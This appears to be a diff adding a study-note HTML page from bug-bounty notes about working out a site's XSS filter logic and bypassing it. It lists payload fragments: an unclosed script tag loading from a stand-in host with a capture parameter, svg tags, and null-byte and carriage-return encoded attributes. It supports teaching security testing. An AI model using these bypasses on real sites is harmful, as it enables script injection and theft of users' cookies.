@@ -1,0 +1,32 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>3. Reverse engineering the developers' thoughts</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>3. Reverse engineering the developers' thoughts</h1><br /><strong>
+      <h3>Reverse engineering the developers&#39; thoughts</h3>
+    </strong><br /><br />This step is about getting into the developers&#39; heads and figuring out what type of filter
+    they&#39;ve created and start asking.. why? Does this same filter exist elsewhere throughout the
+    webapp?<br /><br />So for example if I notice they are filtering
+    <code>&lt;script&gt;</code>,<code>&lt;iframe&gt;</code> aswell as <code>“onerror=”</code>, but notice they aren’t
+    filtering <code>&lt;script</code> then we know it&#39;s game on and time to get creative!<br /> ◇ Are they only
+    looking for complete valid HTML tags? <br /> ▪ If so we can bypass with <code>&lt;script src=//mysite.com?c=</code>
+    <br /> ◇ Is it just a blacklist of bad HTML tags? <br /> ▪ Perhaps the developer isn&#39;t up to date and forgot
+    about things such as &lt;svg&gt;<br /> - Cheatsheet Filter Bypass: <a
+      href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet" target="_blank">https://github.com/masatokinugawa/filterbypass/wiki/Browser&#39;s-XSS-Filter-Bypass-Cheat-Sheet</a><br />
+    ▪ If it is just a blacklist, then does this blacklist exist elsewhere? Think about file uploads<br /> ◇ How does
+    this website in question handle encodings? Try as many different combinations as possible, different encodings,
+    formats<br /> ▪ <code>&lt;%00iframe</code><br /> - %00 → null character (NUL)<br /> ▪ <code>on%0derror</code><br />
+    - %0d → carriage return<br /><br /><br /><br /><strong>Bibliography:</strong><br />Zseano Methodology: <a
+      href="https://www.bugbountyhunter.com/methodology/" target="_blank">https://www.bugbountyhunter.com/methodology/</a>
+  </div>
+</body>
+
+</html>
